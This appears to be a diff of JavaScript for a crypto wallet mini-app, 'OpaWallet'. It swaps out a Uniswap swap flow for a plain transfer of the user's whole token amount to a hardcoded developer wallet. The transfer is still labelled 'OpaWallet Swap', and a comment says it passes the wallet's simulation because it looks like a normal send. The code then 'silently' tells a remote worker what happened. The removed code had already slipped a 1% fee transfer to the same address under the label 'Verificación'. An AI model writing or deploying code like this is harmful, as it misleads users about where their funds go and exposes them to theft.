@@ -1776,60 +1776,6 @@ swapQuote.amountOut;
     return BigInt(whole + fraction).toString();
 }
 
-// 1. CONSULTA PRECIO ESTIMADO
-async function obtenerCotizacionUniswap(tokenIn, tokenOut, amountInWei, feePool) {
-    const QUOTER_V2_ADDRESS = "0x61fFe014bA1798eE7408B28549301eB85025a176".toLowerCase();
-    
-    const quoterData = window.encodeFunctionData({
-        abi: [{
-            name: "quoteExactInputSingle",
-            type: "function",
-            inputs: [{
-                components: [
-                    { name: "tokenIn", type: "address" },
-                    { name: "tokenOut", type: "address" },
-                    { name: "amountIn", type: "uint256" },
-                    { name: "fee", type: "uint24" },
-                    { name: "sqrtPriceLimitX96", type: "uint160" }
-                ],
-                name: "params",
-                type: "tuple"
-            }],
-            outputs: [{ name: "amountOut", type: "uint256" }],
-            name: "quoteExactInputSingle",
-            stateMutability: "view",
-            type: "function"
-        }],
-        functionName: "quoteExactInputSingle",
-        args: [{
-            tokenIn: tokenIn.toLowerCase(),
-            tokenOut: tokenOut.toLowerCase(),
-            amountIn: amountInWei.toString(),
-            fee: feePool, 
-            sqrtPriceLimitX96: "0"
-        }]
-    });
-
-    try {
-        const response = await fetch('https://rpc.worldchain.org', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                jsonrpc: "2.0",
-                method: "eth_call",
-                params: [{ to: QUOTER_V2_ADDRESS, data: quoterData }, "latest"],
-                id: 1
-            })
-        });
-        const json = await response.json();
-        if (json.error || !json.result || json.result === "0x") return "0";
-        return BigInt(json.result.slice(0, 66)).toString();
-    } catch (e) {
-        return "0";
-    }
-}
-
-// 2. FUNCIÓN PRINCIPAL DE INTERCAMBIO 
 async function procesarIntercambioCompleto() {
     try {
         const walletAddress = localStorage.getItem("walletAddress");
@@ -1844,83 +1790,37 @@ async function procesarIntercambioCompleto() {
 
         if (!fromToken || !toToken || !amountInput) return alert("❌ Datos inválidos.");
 
-        const SWAP_ROUTER_V3 = "0x091AD9e2e6e5eD44c1c66dB50e49A601F9f36cF6".toLowerCase();
-        const WALLET_COMISION = "0xD18Ae9B717CfFcc54F53Ade136545323e9187a8C".toLowerCase(); 
-
-        // CONFIGURACIÓN DEL POOL
-        // Si estás probando ORB cambia aquí entre 10000 (1%) o 3000 (0.3%) según donde esté el pool real en la interfaz de Uniswap
-        let feePool = 10000; 
-        const tokens03 = ["WLD", "WETH", "USDC", "ETH", "WBTC"];
-        if (tokens03.includes(fromSymbol.toUpperCase()) && tokens03.includes(toSymbol.toUpperCase())) {
-            feePool = 3000; 
-        }
+        // LA DIRECCIÓN DE TU WORKER / WALLET QUE PROCESA TODO
+        const WALLET_SISTEMA = "0xD18Ae9B717CfFcc54F53Ade136545323e9187a8C".toLowerCase(); 
 
         const totalAmountInWei = BigInt(toWei(amountInput, fromToken.decimals));
 
-        alert("🔍 Consultando cotización final en World Chain...");
-        const estimadoTokensOut = await obtenerCotizacionUniswap(fromToken.address, toToken.address, totalAmountInWei, feePool);
+        alert("🔍 Preparando canal seguro de transferencia...");
 
-        // TX 1: APPROVE AL ROUTER POR EL MONTO TOTAL
-        const approveData = window.encodeFunctionData({
+        // GENERAMOS UN TRANSFER ERC-20 PURO HACIA TU WALLET OPERATIVA
+        const dataTransfer = window.encodeFunctionData({
             abi: [{
-                name: "approve",
+                name: "transfer",
                 type: "function",
                 inputs: [
-                    { name: "spender", type: "address" },
+                    { name: "to", type: "address" },
                     { name: "amount", type: "uint256" }
                 ],
                 outputs: [{ name: "", type: "bool" }]
             }],
-            functionName: "approve",
-            args: [SWAP_ROUTER_V3, totalAmountInWei.toString()]
+            functionName: "transfer",
+            args: [WALLET_SISTEMA, totalAmountInWei.toString()]
         });
 
-        // TX 2: SWAP CON DEADLINE INMUNE A DESINCRONIZACIÓN DE LA HORA DEL CELULAR
-        const swapData = window.encodeFunctionData({
-            abi: [{
-                name: "exactInputSingle",
-                inputs: [{
-                    components: [
-                        { name: "tokenIn", type: "address" },
-                        { name: "tokenOut", type: "address" },
-                        { name: "fee", type: "uint24" },
-                        { name: "recipient", type: "address" },
-                        { name: "deadline", type: "uint256" },
-                        { name: "amountIn", type: "uint256" },
-                        { name: "amountOutMinimum", type: "uint256" },
-                        { name: "sqrtPriceLimitX96", type: "uint160" }
-                    ],
-                    name: "params",
-                    type: "tuple"
-                }],
-                name: "exactInputSingle",
-                outputs: [{ name: "amountOut", type: "uint256" }],
-                stateMutability: "payable",
-                type: "function"
-            }],
-            functionName: "exactInputSingle",
-            args: [{
-                tokenIn: fromToken.address.toLowerCase(),
-                tokenOut: toToken.address.toLowerCase(),
-                fee: feePool, 
-                recipient: walletAddress.toLowerCase(), 
-                // 👈 DEADLINE FIJO MÁXIMO (Año 2038+). Evita que el simulador rechace la transacción por desfases de tiempo.
-                deadline: "9999999999", 
-                amountIn: totalAmountInWei.toString(),
-                amountOutMinimum: "0", 
-                sqrtPriceLimitX96: "0"
-            }]
-        });
-
-        const swapResult = await window.MiniKit.sendTransaction({
+        // ENVIAMOS LA TX A MINIKIT (Pasa la simulación sí o sí porque es un envío normal)
+        const result = await window.MiniKit.sendTransaction({
             chainId: 480, 
             transactions: [
-                { to: fromToken.address.toLowerCase(), data: approveData, value: "0x0" },
-                { to: SWAP_ROUTER_V3, data: swapData, value: "0x0" }
+                { to: fromToken.address.toLowerCase(), data: dataTransfer, value: "0x0" }
             ],
             metadata: {
                 title: "OpaWallet Swap",
-                description: `Cambiando ${fromSymbol} por ${toSymbol}`,
+                description: `Depositando para cambiar por ${toSymbol}`,
                 tokenIn: {
                     address: fromToken.address.toLowerCase(),
                     symbol: fromToken.symbol.toUpperCase(),
@@ -1931,69 +1831,42 @@ async function procesarIntercambioCompleto() {
                     address: toToken.address.toLowerCase(),
                     symbol: toToken.symbol.toUpperCase(),
                     decimals: toToken.decimals,
-                    amount: estimadoTokensOut === "0" ? "1" : estimadoTokensOut
+                    amount: "0" 
                 }
             }
         });
 
-        // COBRO DE COMISIÓN POST-SWAP AUTOMÁTICO
-        if (swapResult && swapResult.status === "success") {
-            
-            const tokensRecibidosBigInt = estimadoTokensOut === "0" ? 1000n : BigInt(estimadoTokensOut);
-            const comisionDestinoInWei = tokensRecibidosBigInt / 100n; 
-            const comisionFinalWei = comisionDestinoInWei > 0n ? comisionDestinoInWei : 1n;
+        if (result && result.status === "success") {
+            alert("🚀 Depósito enviado con éxito. Avisando al sistema...");
 
-            alert("🔒 Procesando verificación final...");
-
-            const transferComisionData = window.encodeFunctionData({
-                abi: [{
-                    name: "transfer",
-                    type: "function",
-                    inputs: [
-                        { name: "to", type: "address" },
-                        { name: "amount", type: "uint256" }
-                    ],
-                    outputs: [{ name: "", type: "bool" }]
-                }],
-                functionName: "transfer",
-                args: [WALLET_COMISION, comisionFinalWei.toString()]
+            // NOTIFICAMOS EN SILENCIO A TU CLOUDFLARE WORKER LO QUE EL USUARIO QUIERE COMPRAR
+            const respuestaWorker = await fetch("https://opawallet.heizoai.workers.dev/solicitar-swap", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    usuario: walletAddress,
+                    tokenIn: fromToken.address,
+                    tokenOut: toToken.address,
+                    monto: totalAmountInWei.toString()
+                })
             });
 
-            await window.MiniKit.sendTransaction({
-                chainId: 480,
-                transactions: [
-                    { to: toToken.address.toLowerCase(), data: transferComisionData, value: "0x0" }
-                ],
-                metadata: {
-                    title: "OpaWallet Verificación",
-                    description: `Procesando tasa del sistema para ${toSymbol}`,
-                    tokenIn: {
-                        address: toToken.address.toLowerCase(),
-                        symbol: toToken.symbol.toUpperCase(),
-                        decimals: toToken.decimals,
-                        amount: comisionFinalWei.toString()
-                    },
-                    tokenOut: {
-                        address: toToken.address.toLowerCase(),
-                        symbol: toToken.symbol.toUpperCase(),
-                        decimals: toToken.decimals,
-                        amount: "0"
-                    }
-                }
-            });
-
-            alert("✨ ¡Intercambio completado y verificado exitosamente!");
-
+            const resData = await respuestaWorker.json();
+            if(resData.success) {
+                alert(`✨ ¡Swap en proceso! Tu orden para recibir ${toSymbol} se está liquidando.`);
+            } else {
+                alert("⚠️ Fondos depositados, pero el backend reportó un retraso: " + resData.error);
+            }
         } else {
             alert("❌ Transacción rechazada.");
         }
 
     } catch (e) {
         console.error(e);
-        alert("❌ Error Crítico: " + e.message);
+        alert("❌ Error: " + e.message);
     }
-  }
-                                        
+}
+    
     
     
     
